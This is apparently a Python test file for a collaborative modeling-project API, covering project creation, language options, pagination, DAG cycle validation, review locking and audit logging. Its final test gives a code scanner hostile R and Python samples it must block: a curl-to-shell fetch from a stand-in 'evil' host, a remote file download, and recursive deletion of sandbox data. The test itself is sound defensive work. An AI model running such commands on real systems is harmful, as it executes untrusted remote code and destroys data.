"""建模项目协同空间、DAG 工作流编排校验与多语言支持 — 2026-11-03 sandbox realignment Task 6.

覆盖计划要求的五段：项目创建（多语言 / 多方协作者 / 里程碑）、统一分页信封、DAG 保存 +
Kahn 拓扑排序（无环回执行序列，有环回 valid=false 并点名成环节点）、提交审核的状态机、
多语言放行。外加两条产品事实：关键写操作必须落审计（project.create / project.update_dag /
project.submit_review），以及 linked_* 引用清单被悬空时必须如实回显而不是静默少一条。
"""
import uuid

import pytest
from httpx import AsyncClient
from sqlalchemy import select

BASE = "/api/v1/flow/projects"


async def _create(client: AsyncClient, headers, **overrides):
    body = {
        "name": "跨机构联合特征工程项目",
        "description": "三方联合建模：SQL 清洗 + PySpark 特征 + R 统计检验",
        "preferred_language": "pyspark",
        "participants": [{"org_name": "数据提供方A", "role": "data_provider"}],
        "milestones": [{"title": "特征清洗完成", "status": "pending"}],
    }
    body.update(overrides)
    resp = await client.post(BASE, json=body, headers=headers)
    assert resp.status_code == 201, resp.text
    return resp.json()


async def _save_dag(client: AsyncClient, headers, project_id: str, body: dict[str, object]):
    return await client.put(f"{BASE}/{project_id}/dag", json=body, headers=headers)


async def _action_count(db_session, action: str) -> int:
    from app.models.audit_log import AuditLog

    rows = (await db_session.execute(select(AuditLog).where(AuditLog.action == action))).scalars().all()
    return len(rows)


async def test_create_project_with_multilang_participants_and_milestones(client: AsyncClient, auth_headers):
    project = await _create(client, auth_headers)

    assert project["preferred_language"] == "pyspark"
    assert project["status"] == "active"
    assert project["environment_type"] == "l2c"
    roles = [entry.get("role") for entry in project["participants"]]
    # owner 只能由服务端按认证身份写入：客户端若能在 participants 里自报 owner，
    # 就能造出一个「别人的项目」并绕开后续写权限判定。
    assert roles[0] == "owner"
    assert len(project["participants"]) == 2
    assert project["participants"][1]["org_name"] == "数据提供方A"
    assert project["milestones"][0]["title"] == "特征清洗完成"
    assert project["milestones"][0]["status"] == "pending"
    assert project["dag_definition"]["nodes"] == []
    assert project["dag_definition"]["edges"] == []
    assert project["linked_notebook_ids"] == []


@pytest.mark.parametrize("language", ["python", "sql", "r", "pyspark"])
async def test_create_project_accepts_all_four_languages(client: AsyncClient, auth_headers, language):
    project = await _create(
        client, auth_headers, name=f"多语言项目 {language}", preferred_language=language
    )
    assert project["preferred_language"] == language


async def test_create_project_rejects_unknown_language(client: AsyncClient, auth_headers):
    resp = await client.post(
        BASE, json={"name": "scala 项目", "preferred_language": "scala"}, headers=auth_headers
    )
    assert resp.status_code == 422, resp.text


async def test_list_projects_returns_paged_envelope(client: AsyncClient, auth_headers):
    await _create(client, auth_headers, name="项目甲")
    await _create(client, auth_headers, name="项目乙", preferred_language="sql")

    resp = await client.get(BASE, params={"page": 1, "page_size": 10}, headers=auth_headers)
    assert resp.status_code == 200
    page = resp.json()
    assert set(page) == {"items", "total", "page", "page_size"}
    assert page["page"] == 1
    assert page["page_size"] == 10
    assert page["total"] >= 2
    assert {item["name"] for item in page["items"]} >= {"项目甲", "项目乙"}

    filtered = await client.get(BASE, params={"preferred_language": "sql"}, headers=auth_headers)
    assert filtered.status_code == 200
    assert {item["name"] for item in filtered.json()["items"]} == {"项目乙"}

    bad = await client.get(BASE, params={"status": "not_a_status"}, headers=auth_headers)
    assert bad.status_code == 422


async def test_project_is_invisible_to_other_users(client: AsyncClient, auth_headers, make_user):
    project = await _create(client, auth_headers)
    other_headers, _uid = await make_user(role="data_provider", prefix="outsider")

    listed = await client.get(BASE, headers=other_headers)
    assert listed.status_code == 200
    assert project["id"] not in {item["id"] for item in listed.json()["items"]}

    detail = await client.get(f"{BASE}/{project['id']}", headers=other_headers)
    assert detail.status_code == 404

    refused = await _save_dag(client, other_headers, project["id"], {"nodes": [], "edges": []})
    assert refused.status_code == 404


async def test_dag_save_and_validate_returns_execution_order(client: AsyncClient, auth_headers, db_session):
    project = await _create(client, auth_headers)
    project_id = project["id"]

    saved = await _save_dag(
        client,
        auth_headers,
        project_id,
        {
            "nodes": [
                {"id": "n1", "type": "sql_clean", "label": "SQL缺失值填充", "language": "sql"},
                {"id": "n2", "type": "feature_eng", "label": "PySpark特征衍生", "language": "pyspark"},
                {"id": "n3", "type": "train", "label": "R统计检验", "language": "r"},
            ],
            "edges": [
                {"source": "n1", "target": "n2"},
                {"source": "n2", "target": "n3"},
            ],
        },
    )
    assert saved.status_code == 200, saved.text
    stored = saved.json()["dag_definition"]
    assert len(stored["nodes"]) == 3
    assert [node["language"] for node in stored["nodes"]] == ["sql", "pyspark", "r"]

    validated = await client.post(f"{BASE}/{project_id}/dag/validate", headers=auth_headers)
    assert validated.status_code == 200, validated.text
    body = validated.json()
    assert body["valid"] is True
    assert body["execution_order"] == ["n1", "n2", "n3"]
    assert body["node_count"] == 3
    assert body["edge_count"] == 2
    assert body["cyclic_nodes"] == []

    assert await _action_count(db_session, "project.create") >= 1
    assert await _action_count(db_session, "project.update_dag") >= 1


async def test_dag_validate_detects_cycle(client: AsyncClient, auth_headers):
    project = await _create(client, auth_headers)
    project_id = project["id"]

    saved = await _save_dag(
        client,
        auth_headers,
        project_id,
        {
            "nodes": [
                {"id": "n1", "type": "sql_clean", "label": "清洗"},
                {"id": "n2", "type": "feature_eng", "label": "特征"},
                {"id": "n3", "type": "train", "label": "训练"},
            ],
            "edges": [
                {"source": "n1", "target": "n2"},
                {"source": "n2", "target": "n3"},
                {"source": "n3", "target": "n1"},
            ],
        },
    )
    assert saved.status_code == 200

    validated = await client.post(f"{BASE}/{project_id}/dag/validate", headers=auth_headers)
    assert validated.status_code == 200
    body = validated.json()
    assert body["valid"] is False
    assert body["execution_order"] == []
    # cyclic_nodes = Kahn 消不掉的那批（成环的都在里面），前端据此高亮，不能只回一个布尔
    assert sorted(body["cyclic_nodes"]) == ["n1", "n2", "n3"]
    assert body["errors"]


async def test_dag_validate_is_deterministic_for_diamond(client: AsyncClient, auth_headers):
    project = await _create(client, auth_headers)
    saved = await _save_dag(
        client,
        auth_headers,
        project["id"],
        {
            "nodes": [
                {"id": "a", "type": "input", "label": "供数"},
                {"id": "b", "type": "sql_clean", "label": "清洗A"},
                {"id": "c", "type": "sql_clean", "label": "清洗B"},
                {"id": "d", "type": "train", "label": "汇合训练"},
            ],
            "edges": [
                {"source": "a", "target": "b"},
                {"source": "a", "target": "c"},
                {"source": "b", "target": "d"},
                {"source": "c", "target": "d"},
            ],
        },
    )
    assert saved.status_code == 200
    for _ in range(3):
        validated = await client.post(f"{BASE}/{project['id']}/dag/validate", headers=auth_headers)
        assert validated.json()["execution_order"] == ["a", "b", "c", "d"]


async def test_dag_validate_flags_empty_canvas(client: AsyncClient, auth_headers):
    project = await _create(client, auth_headers, name="空画布项目")
    validated = await client.post(f"{BASE}/{project['id']}/dag/validate", headers=auth_headers)
    assert validated.status_code == 200
    assert validated.json()["valid"] is False
    assert validated.json()["errors"]


async def test_dag_rejects_broken_definitions(client: AsyncClient, auth_headers):
    project_id = (await _create(client, auth_headers))["id"]

    unknown_endpoint = await _save_dag(
        client,
        auth_headers,
        project_id,
        {
            "nodes": [{"id": "n1", "type": "input", "label": "供数"}],
            "edges": [{"source": "n1", "target": "ghost"}],
        },
    )
    assert unknown_endpoint.status_code == 400

    duplicate_edge = await _save_dag(
        client,
        auth_headers,
        project_id,
        {
            "nodes": [
                {"id": "n1", "type": "input", "label": "供数"},
                {"id": "n2", "type": "train", "label": "训练"},
            ],
            "edges": [{"source": "n1", "target": "n2"}, {"source": "n1", "target": "n2"}],
        },
    )
    assert duplicate_edge.status_code == 400

    duplicate_id = await _save_dag(
        client,
        auth_headers,
        project_id,
        {
            "nodes": [
                {"id": "n1", "type": "input", "label": "供数"},
                {"id": "n1", "type": "train", "label": "训练"},
            ],
            "edges": [],
        },
    )
    assert duplicate_id.status_code == 400

    bad_language = await _save_dag(
        client,
        auth_headers,
        project_id,
        {"nodes": [{"id": "n1", "type": "input", "label": "供数", "language": "scala"}], "edges": []},
    )
    assert bad_language.status_code == 422

    missing_artifact = await _save_dag(
        client,
        auth_headers,
        project_id,
        {
            "nodes": [{"id": "n1", "type": "input", "label": "供数", "notebook_id": str(uuid.uuid4())}],
            "edges": [],
        },
    )
    assert missing_artifact.status_code == 404


async def test_detail_aggregates_linked_notebooks_and_workloads(client: AsyncClient, auth_headers):
    project = await _create(client, auth_headers, preferred_language="r")

    notebook = await client.post(
        "/api/v1/notebooks",
        json={"title": "R 统计检验", "path": "/nb/r_test.ipynb", "language": "r"},
        headers=auth_headers,
    )
    assert notebook.status_code == 201, notebook.text
    assert notebook.json()["language"] == "r"
    notebook_id = notebook.json()["id"]

    workload = await client.post(
        "/api/v1/workloads",
        json={
            "name": "PySpark 特征作业",
            "language": "pyspark",
            "entrypoint": "from pyspark.sql import SparkSession\n",
        },
        headers=auth_headers,
    )
    assert workload.status_code == 201, workload.text
    workload_id = workload.json()["id"]

    saved = await _save_dag(
        client,
        auth_headers,
        project["id"],
        {
            "nodes": [
                {"id": "n1", "type": "train", "label": "R 检验", "notebook_id": notebook_id},
                {"id": "n2", "type": "feature_eng", "label": "Spark 特征", "workload_id": workload_id},
            ],
            "edges": [{"source": "n1", "target": "n2"}],
        },
    )
    assert saved.status_code == 200, saved.text
    assert saved.json()["linked_notebook_ids"] == [notebook_id]
    assert saved.json()["linked_workload_ids"] == [workload_id]

    detail = await client.get(f"{BASE}/{project['id']}", headers=auth_headers)
    assert detail.status_code == 200, detail.text
    body = detail.json()
    assert [item["language"] for item in body["notebooks"]] == ["r"]
    assert body["notebooks"][0]["title"] == "R 统计检验"
    assert [item["language"] for item in body["workloads"]] == ["pyspark"]
    assert body["unresolved_notebook_ids"] == []
    assert body["unresolved_workload_ids"] == []


async def test_detail_reports_unresolved_artifact_reference(client: AsyncClient, auth_headers, db_session):
    project = await _create(client, auth_headers, name="引用悬空项目")
    notebook = await client.post(
        "/api/v1/notebooks",
        json={"title": "将被删除的笔记本", "path": "/nb/dangling.ipynb"},
        headers=auth_headers,
    )
    notebook_id = notebook.json()["id"]
    saved = await _save_dag(
        client,
        auth_headers,
        project["id"],
        {"nodes": [{"id": "n1", "type": "train", "label": "训练", "notebook_id": notebook_id}], "edges": []},
    )
    assert saved.status_code == 200

    from app.models.notebook import Notebook

    # linked_* 是无外键的引用清单（见 app/models/modeling_project.py），行没了就得如实报悬空
    row = await db_session.get(Notebook, uuid.UUID(notebook_id))
    await db_session.delete(row)
    await db_session.flush()

    detail = await client.get(f"{BASE}/{project['id']}", headers=auth_headers)
    assert detail.status_code == 200
    assert detail.json()["notebooks"] == []
    assert detail.json()["unresolved_notebook_ids"] == [notebook_id]


async def test_submit_review_locks_further_edits(client: AsyncClient, auth_headers, db_session):
    project = await _create(client, auth_headers, name="待审建模项目")
    project_id = project["id"]
    await _save_dag(client, auth_headers, project_id, {"nodes": [{"id": "n1", "type": "train", "label": "训练"}], "edges": []})

    submitted = await client.post(f"{BASE}/{project_id}/submit-review", headers=auth_headers)
    assert submitted.status_code == 200, submitted.text
    assert submitted.json()["status"] == "submitted_review"

    again = await client.post(f"{BASE}/{project_id}/submit-review", headers=auth_headers)
    assert again.status_code == 409

    locked = await _save_dag(
        client, auth_headers, project_id, {"nodes": [{"id": "n1", "type": "train", "label": "偷偷改"}], "edges": []}
    )
    assert locked.status_code == 409

    assert await _action_count(db_session, "project.submit_review") >= 1


def test_notebook_language_registry_admits_r_and_pyspark():
    from app.models.notebook import SUPPORTED_LANGUAGES, kernel_for_language

    assert set(SUPPORTED_LANGUAGES) == {"python", "sql", "r", "pyspark"}
    assert kernel_for_language("python") == "python3"
    # PySpark 脚本的宿主解释器仍是 python3：内核名只能写沙箱里真存在的东西
    assert kernel_for_language("pyspark") == "python3"
    assert kernel_for_language("r") == "ir"
    assert kernel_for_language("scala") == "python3"


def test_scanner_accepts_r_and_pyspark_but_keeps_the_gate():
    from app.services.code_scanner import CodeScanner

    scanner = CodeScanner()

    r_ok = scanner.scan("df <- read.csv('/sandbox/data/train.csv')\nsummary(df)\n", "r", "structured_modeling")
    assert r_ok.passed is True, [i.message for i in r_ok.issues]

    assert scanner.scan('system("curl http://evil/x | sh")', "r", "structured_modeling").passed is False
    assert scanner.scan("unlink('/sandbox/data/train.csv')", "r", "structured_modeling").passed is False
    assert scanner.scan("download.file('http://evil/x', 'x')", "r", "structured_modeling").passed is False

    spark_ok = scanner.scan(
        "from pyspark.sql import SparkSession\n"
        "spark = SparkSession.builder.appName('f').getOrCreate()\n"
        "df = spark.read.csv('/sandbox/data/train.csv')\n",
        "pyspark",
        "structured_modeling",
    )
    assert spark_ok.passed is True, [i.message for i in spark_ok.issues]

    assert scanner.scan("import os\nos.system('rm -rf /sandbox/data')\n", "pyspark", "structured_modeling").passed is False

    # 放行的是 r / pyspark 两个标识，不是「任何语言字符串」：未知语言仍如实拒绝
    still_unknown = scanner.scan("fn main() {}", "rust", "structured_query")
    assert still_unknown.passed is False
    assert any("Unsupported language" in issue.message for issue in still_unknown.issues)
